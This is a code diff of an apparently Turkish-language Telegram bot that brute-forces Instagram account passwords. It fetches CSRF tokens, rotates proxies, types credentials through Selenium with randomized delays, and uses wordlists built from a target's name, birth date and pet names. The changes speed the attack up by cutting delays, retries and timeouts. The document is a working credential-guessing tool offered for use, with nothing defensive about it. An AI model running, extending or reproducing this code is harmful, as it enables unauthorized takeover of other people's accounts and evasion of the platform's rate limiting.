@@ -27,7 +27,7 @@ from urllib.parse import quote
 import os
 
 # Log ayarları
-logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 
 # Telegram bot token
@@ -231,7 +231,7 @@ class InstagramBruteForce:
             return False
 
     async def _get_initial_cookies_and_tokens(self, progress_callback: Optional[callable] = None):
-        max_attempts = 50
+        max_attempts = 3
         for attempt in range(1, max_attempts + 1):
             if self.proxy_list:
                 self.current_proxy = self._get_working_proxy(progress_callback)
@@ -241,12 +241,12 @@ class InstagramBruteForce:
                     self.session.proxies = {}
             
             try:
-                response = self.session.get('https://www.instagram.com/', timeout=15)
+                response = self.session.get('https://www.instagram.com/', timeout=10)
                 if response.status_code != 200:
                     raise Exception(f"Instagram'a erişilemiyor: {response.status_code}")
                 self.mid_cookie = self.session.cookies.get('mid')
                 self.ig_did = self.session.cookies.get('ig_did')
-                response = self.session.get(self.login_url, timeout=15)
+                response = self.session.get(self.login_url, timeout=10)
                 self.csrf_token = self.session.cookies.get('csrftoken')
                 if not self.csrf_token:
                     csrf_match = re.search(r'"csrf_token":"([^"]+)"', response.text)
@@ -266,7 +266,7 @@ class InstagramBruteForce:
                 if progress_callback:
                     await progress_callback("🔍 Token bulmaya çalışıyorum, sabret...")
                 if attempt < max_attempts:
-                    await asyncio.sleep(5)
+                    await asyncio.sleep(2)
                 continue
         if progress_callback:
             await progress_callback("🔍 Token bulmaya çalışıyorum, sabret... (Selenium'a geçiliyor)")
@@ -274,7 +274,7 @@ class InstagramBruteForce:
 
     async def _selenium_get_tokens(self, progress_callback: Optional[callable] = None):
         attempt = 1
-        while True:
+        while attempt <= 3:
             if self.proxy_list:
                 self.current_proxy = self._get_working_proxy(progress_callback)
                 if self.current_proxy:
@@ -288,12 +288,12 @@ class InstagramBruteForce:
             if not self._setup_selenium():
                 if progress_callback:
                     await progress_callback("🔍 Token bulmaya çalışıyorum, sabret...")
-                await asyncio.sleep(5)
+                await asyncio.sleep(2)
                 attempt += 1
                 continue
             try:
                 self.driver.get('https://www.instagram.com/')
-                time.sleep(3)
+                time.sleep(2)
                 self.driver.get(self.login_url)
                 time.sleep(2)
                 csrf_token = self.driver.get_cookie('csrftoken')
@@ -317,12 +317,13 @@ class InstagramBruteForce:
                 logger.error(f"Selenium token alma hatası (Deneme {attempt}): {e}")
                 if progress_callback:
                     await progress_callback("🔍 Token bulmaya çalışıyorum, sabret...")
-                await asyncio.sleep(5)
+                await asyncio.sleep(2)
                 attempt += 1
             finally:
                 if self.driver:
                     self.driver.quit()
                     self.driver = None
+        return False
 
     def _make_login_request(self, username: str, password: str):
         headers = {
@@ -348,7 +349,7 @@ class InstagramBruteForce:
             'trustedDeviceRecords': '{}'
         }
         try:
-            response = self.session.post(self.api_url, headers=headers, data=data, timeout=15)
+            response = self.session.post(self.api_url, headers=headers, data=data, timeout=10)
             logger.debug(f"API Yanıtı: {response.text}")
             with open('instagram_response.json', 'a', encoding='utf-8') as f:
                 f.write(f"Şifre: {password}, Yanıt: {response.text}\n")
@@ -371,15 +372,15 @@ class InstagramBruteForce:
             password_field = self.driver.find_element(By.NAME, "password")
             for char in username:
                 username_field.send_keys(char)
-                time.sleep(random.uniform(0.1, 0.3))
-            time.sleep(random.uniform(0.5, 1))
+                time.sleep(random.uniform(0.05, 0.1))
+            time.sleep(random.uniform(0.3, 0.5))
             for char in password:
                 password_field.send_keys(char)
-                time.sleep(random.uniform(0.1, 0.3))
-            time.sleep(random.uniform(1, 2))
+                time.sleep(random.uniform(0.05, 0.1))
+            time.sleep(random.uniform(0.5, 1))
             login_button = self.driver.find_element(By.XPATH, "//button[@type='submit']")
             login_button.click()
-            time.sleep(5)
+            time.sleep(3)
             current_url = self.driver.current_url
             page_source = self.driver.page_source
             if any(indicator in current_url for indicator in ['/', '/direct/', '/explore/', '/accounts/onetap/']):
@@ -478,7 +479,7 @@ class InstagramBruteForce:
             return None
 
         failed_attempts = 0
-        max_failed = 5
+        max_failed = 3
 
         for i, password in enumerate(password_list):
             if time.time() - start_time > timeout:
@@ -489,7 +490,7 @@ class InstagramBruteForce:
                     logger.error(f"Progress callback error: {e}")
                     break
 
-            if self.proxy_list:
+            if self.proxy_list and i % 10 == 0:
                 try:
                     await progress_callback("🔄 Proxy değiştiriliyor...")
                     self.current_proxy = self._get_working_proxy(progress_callback)
@@ -565,7 +566,7 @@ class InstagramBruteForce:
                     potential_passwords.add(password)
                     try:
                         await progress_callback(f"🔄 Hata oldu (Şifre: {password}), loglara kaydedildi, Selenium deneniyor...")
-                        await asyncio.sleep(30)
+                        await asyncio.sleep(15)
                         result = self._selenium_login_attempt(username, password)
                     except TelegramError as e:
                         logger.error(f"Progress callback error: {e}")
@@ -620,20 +621,20 @@ class InstagramBruteForce:
                                 failed_attempts = 0
                             else:
                                 await progress_callback("🔍 Çalışan proxy bulunamadı, proxysiz devam ediyorum...")
-                                await asyncio.sleep(60)
+                                await asyncio.sleep(30)
                         except TelegramError as e:
                             logger.error(f"Progress callback error: {e}")
                     else:
                         try:
-                            await progress_callback("🔍 60 saniye bekleniyor...")
-                            await asyncio.sleep(60)
+                            await progress_callback("🔍 30 saniye bekleniyor...")
+                            await asyncio.sleep(30)
                             failed_attempts = 0
                         except TelegramError as e:
                             logger.error(f"Progress callback error: {e}")
 
             tried_passwords += 1
 
-            if (i + 1) % 5 == 0:
+            if (i + 1) % 10 == 0:
                 try:
                     await progress_callback("🔄 Token'lar yenileniyor...")
                     success = await self._get_initial_cookies_and_tokens(progress_callback)
@@ -645,7 +646,7 @@ class InstagramBruteForce:
                 except TelegramError as e:
                     logger.error(f"Progress callback error: {e}")
 
-            delay = random.uniform(10, 20)
+            delay = random.uniform(5, 10)
             try:
                 await progress_callback(f"⏳ {delay:.1f}s bekleniyor...")
                 await asyncio.sleep(delay)
@@ -1101,7 +1102,7 @@ class TelegramBot:
                 "   - *Oluştur*: Ad, soyad, doğum tarihi, evcil hayvan adı, şirket adı veya anahtar kelimeler girerek kişiselleştirilmiş şifre listesi yap. Leet mode (ör: leet → 1337), özel karakterler (!@#) ve rastgele sayılar (01-99) ekleyebilirsin. Liste hazır olunca .txt olarak indirilecek!\n"
                 "3. *Proxy Listesi Yükle* 🌐 (İsteğe bağlı): Daha güvenli test için proxy listesi (.txt) yükle.\n"
                 "4. *Timeout Ayarla* ⏰: İşlemin ne kadar süreceğini (60-7200 saniye) belirle.\n"
-                "5. *Saldırıyı Başlat* 🚀: Her şey hazır olunca brute-force’u başlat. İşlem bitince rapor alacaksın:\n"
+                "5. *Saldırıyı Başlat* 🚀: Her şey hazır olunca brute-force'u başlat. İşlem bitince rapor alacaksın:\n"
                 "   - Denenen şifre sayısı\n"
                 "   - Hata alınan şifreler (doğru olabilir, manuel kontrol et)\n\n"
                 "*💡 İpuçları*:\n"
@@ -1278,4 +1279,3 @@ if __name__ == "__main__":
     import nest_asyncio
     nest_asyncio.apply()
     asyncio.run(main())
-
